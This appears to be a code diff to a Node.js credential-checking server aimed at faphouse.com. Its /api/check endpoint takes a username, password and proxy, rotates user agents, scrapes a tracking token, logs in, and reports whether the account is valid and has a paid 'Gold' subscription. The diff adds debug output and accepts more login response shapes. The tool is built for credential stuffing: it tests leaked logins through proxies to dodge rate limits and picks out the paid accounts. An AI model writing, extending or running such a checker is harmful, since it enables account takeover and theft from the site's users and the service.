@@ -21,43 +21,31 @@ function getRandomUA() {
   return uas[Math.floor(Math.random() * uas.length)];
 }
 
-// ✅ আপডেটেড Proxy Parser (এখন host:port:user:pass সাপোর্ট করে)
+// Proxy parser (supports host:port:user:pass and URL format)
 function parseProxy(str) {
   try {
-    // 1. চেক করা হচ্ছে ফরম্যাটটি "host:port:user:pass" কিনা
     const parts = str.split(':');
     if (parts.length === 4) {
       const [host, port, username, password] = parts;
-      // পোর্ট নাম্বার ভ্যালিড কিনা চেক
       const portNum = parseInt(port);
       if (!isNaN(portNum) && host) {
-        return {
-          host: host,
-          port: portNum,
-          protocol: 'http',  // HTTP প্রক্সি হিসেবে ধরা হচ্ছে
-          auth: { username, password }
-        };
+        return { host, port: portNum, protocol: 'http', auth: { username, password } };
       }
     }
-
-    // 2. যদি না হয়, তাহলে স্ট্যান্ডার্ড URL ফরম্যাট চেক (http://user:pass@host:port)
     const url = new URL(str);
     const protocol = url.protocol.replace(':', '');
     const host = url.hostname;
     const port = parseInt(url.port) || (protocol === 'https' ? 443 : 80);
     const auth = url.username ? { username: url.username, password: url.password } : undefined;
-    
     if (protocol === 'http' || protocol === 'https') {
       return { host, port, protocol, auth };
     }
     return null;
   } catch (e) {
-    console.warn('Proxy parse error:', str, e.message);
     return null;
   }
 }
 
-// ─── Main check endpoint ───
 app.post('/api/check', async (req, res) => {
   const { username, password, proxy } = req.body;
 
@@ -70,9 +58,9 @@ app.post('/api/check', async (req, res) => {
     const parsed = parseProxy(proxy);
     if (parsed) {
       proxyConfig = parsed;
-      console.log(`✅ Using proxy: ${proxyConfig.host}:${proxyConfig.port}`);
+      console.log(`Using proxy: ${proxyConfig.host}:${proxyConfig.port}`);
     } else {
-      console.warn(`⚠️ Invalid proxy format: ${proxy}, skipping...`);
+      console.warn(`Invalid proxy format: ${proxy}`);
     }
   }
 
@@ -87,15 +75,19 @@ app.post('/api/check', async (req, res) => {
     ...(proxyConfig && { proxy: proxyConfig })
   };
 
+  let debugInfo = {};
+
   try {
     // Step 1: Get trackingParamsBag
     const homeResp = await axios.get('https://faphouse.com/', axiosConfig);
     const html = homeResp.data;
+    debugInfo.homeStatus = homeResp.status;
     const match = html.match(/trackingParamsBag\\":\\"([^"]+)\\"/);
     if (!match) {
-      return res.status(500).json({ success: false, error: 'Could not extract trackingParamsBag' });
+      return res.status(500).json({ success: false, error: 'Could not extract trackingParamsBag', debug: debugInfo });
     }
     const trackingParamsBag = match[1];
+    debugInfo.trackingParamsBag = trackingParamsBag;
 
     // Step 2: Login
     const loginPayload = {
@@ -131,20 +123,36 @@ app.post('/api/check', async (req, res) => {
     );
 
     const data = loginResp.data;
+    debugInfo.loginStatus = loginResp.status;
+    debugInfo.loginData = data; // পুরো রেসপন্স ডেটা
 
+    // চেক করা হচ্ছে "Invalid credential"
     if (data && data.message && data.message.includes('Invalid credential')) {
-      return res.json({ success: false, gold: false, error: 'Invalid credential' });
+      return res.json({ success: false, gold: false, error: 'Invalid credential', debug: debugInfo });
     }
 
-    const success = data && (data.success === true || data.status === 'success' || data.message === 'success');
+    // সফলতা চেক – অনেক ভেরিয়েন্ট
+    let success = false;
+    if (data && (data.success === true || data.status === 'success' || data.message === 'success')) {
+      success = true;
+    }
+    // যদি data.success undefined থাকে কিন্তু data.user থাকে, তাহলেও সফল
+    if (data && data.user && data.user.id) {
+      success = true;
+    }
+
     if (!success) {
-      return res.json({ success: false, gold: false, error: 'Login failed' });
+      return res.json({ success: false, gold: false, error: 'Login failed (no success flag)', debug: debugInfo });
     }
 
+    // Gold চেক
     let hasGold = false;
     if (data && data.hasGoldSubscription !== undefined) {
       hasGold = data.hasGoldSubscription === true || data.hasGoldSubscription === 'true';
+    } else if (data && data.user && data.user.hasGoldSubscription !== undefined) {
+      hasGold = data.user.hasGoldSubscription === true || data.user.hasGoldSubscription === 'true';
     } else {
+      // fallback profile check
       try {
         const profileResp = await axios.get('https://faphouse.com/api/user/profile', {
           ...axiosConfig,
@@ -156,22 +164,25 @@ app.post('/api/check', async (req, res) => {
         if (profileResp.data && profileResp.data.hasGoldSubscription !== undefined) {
           hasGold = profileResp.data.hasGoldSubscription === true;
         }
+        debugInfo.profileData = profileResp.data;
       } catch (_) {}
     }
 
-    return res.json({ success: true, gold: hasGold });
+    return res.json({ success: true, gold: hasGold, debug: debugInfo });
 
   } catch (error) {
     console.error('Check error:', error.message);
-    // error.response দেখলে বুঝবেন আসলে কী সমস্যা (৪০৩, ৪২৯, ইত্যাদি)
     if (error.response) {
-      console.error('Status:', error.response.status);
-      console.error('Data:', error.response.data);
+      debugInfo.errorStatus = error.response.status;
+      debugInfo.errorData = error.response.data;
+    } else {
+      debugInfo.errorMessage = error.message;
     }
     return res.status(500).json({
       success: false,
       gold: false,
-      error: error.message || 'Request failed'
+      error: error.message || 'Request failed',
+      debug: debugInfo
     });
   }
 });
